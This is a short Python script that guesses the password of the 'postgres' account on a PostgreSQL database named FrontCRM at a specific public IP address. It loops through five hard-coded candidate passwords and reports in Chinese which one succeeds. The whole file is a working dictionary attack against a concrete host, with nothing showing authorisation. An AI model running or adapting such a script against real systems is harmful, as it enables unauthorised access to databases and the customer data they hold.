import psycopg2

passwords = ['1234', 'postgres1234', 'adm@FF#1720', 'postgres', 'admin']

for pwd in passwords:
    try:
        conn = psycopg2.connect(
            host='129.226.161.3',
            port='5432',
            database='FrontCRM',
            user='postgres',
            password=pwd,
            connect_timeout=5
        )
        print(f'成功! 密码是: {pwd}')
        conn.close()
        break
    except psycopg2.OperationalError as e:
        if 'password authentication failed' in str(e):
            print(f'密码 {pwd} 错误')
        else:
            print(f'其他错误: {e}')
            break
